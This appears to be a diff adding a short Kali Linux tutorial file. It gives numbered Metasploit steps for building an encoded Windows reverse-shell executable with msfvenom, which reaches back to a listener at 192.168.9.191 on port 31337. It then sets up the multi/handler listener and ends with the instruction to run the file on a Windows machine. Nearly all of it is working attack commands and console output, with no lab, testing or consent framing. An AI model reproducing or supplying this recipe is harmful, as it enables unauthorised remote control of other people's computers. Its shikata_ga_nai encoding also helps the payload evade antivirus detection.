@@ -1,0 +1,46 @@
+KALI LINUX
+
+1) Boot Kali Linux in PC
+
+2) open Metasploit
+
+3) creating applocation payload for Windows OS: 
+> msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+
+4) > msfconsole
+
+5) > use exploit/multi/handler
+
+6) > msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
+
+7) > payload => windows/shell/reverse_tcp
+
+8) > Show options
+
+9) > msf exploit(multi/handler) > set LHOST 192.168.9.191 
+
+10) > LHOST => 192.168.9.191
+
+11) > msf exploit(multi/handler) > set LPORT 31337 
+
+12) > LPORT => 31337 
+
+13) > msf exploit(multi/handler) > exploit 
+
+14) Place the 1.exe file in Windows OS and Double click it.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
